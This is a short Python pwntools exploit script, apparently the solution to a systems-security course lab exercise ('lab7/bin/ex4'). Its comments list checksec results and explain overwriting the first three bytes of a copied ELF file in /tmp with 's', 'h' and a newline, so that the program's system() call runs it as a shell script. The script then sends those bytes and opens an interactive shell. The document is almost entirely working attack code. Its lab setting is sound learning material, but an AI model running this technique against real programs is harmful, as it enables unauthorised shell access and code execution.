#!/usr/bin/env python

from pwn import *

# quick checksec on the binary
# [*] '/home/aapostol/workspace/osds/lab7/bin/ex4'
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     Stripped:   No
#     Debuginfo:  Yes
# No stack canary, we can have overflow
# That doesn't help us...

# from the source code, we can change 3 bytes of the file copied in /tmp/<random_name>
# that copied file is an executable file, so then system("/tmp/<random_name>") is valid
# We know that an ELF file starts with some 4 very special bytes: 0x7F E L F
# We can change those bytes to s h \n -> system actually treats it like a bash script

target = process("./bin/ex4")

# s = 115, h = 104 and '\n' = 10
target.sendline(b'115')
target.sendline(b'0') # first byte

target.sendline(b'104')
target.sendline(b'1') # second byte

target.sendline(b'10')
target.sendline(b'2') # third byte

target.interactive()
